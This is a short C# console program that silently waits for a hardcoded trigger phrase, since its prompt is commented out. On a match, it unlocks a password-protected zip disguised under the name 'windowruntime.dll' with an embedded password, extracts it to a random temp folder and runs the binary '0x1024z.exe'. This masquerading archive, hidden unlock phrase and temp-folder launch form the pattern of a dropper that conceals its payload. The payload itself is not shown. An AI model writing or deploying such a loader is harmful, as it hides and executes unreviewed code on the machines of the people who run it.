using Ionic.Zip;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ChangeInforWindow
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            //Console.WriteLine("Nhập mật khẩu: ");
            string password = Console.ReadLine();
            Console.Clear();

            if (password == "console.read{debugABC}autochange window info")
            {
                buildApp();
            }
            else
            {
                Console.WriteLine("Mrdunghr Không thể thực hiện buildApp().");
            }
        }

        public static string buildApp()
        {
            string pathExe = GetTemporaryDirectory();
            string zipFile = "windowruntime.dll";
            string targetDirectory = pathExe;

            using (ZipFile zip = ZipFile.Read(zipFile))
            {
                zip.Password = "ETIVN@2022!";
                zip.ExtractAll(targetDirectory, ExtractExistingFileAction.DoNotOverwrite);
            }
            Process.Start(pathExe + "\\0x1024z.exe");
            return pathExe;
        }

        public static string GetTemporaryDirectory()
        {
            string tempDirectory = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            Directory.CreateDirectory(tempDirectory);
            return tempDirectory;
        }

    }
}
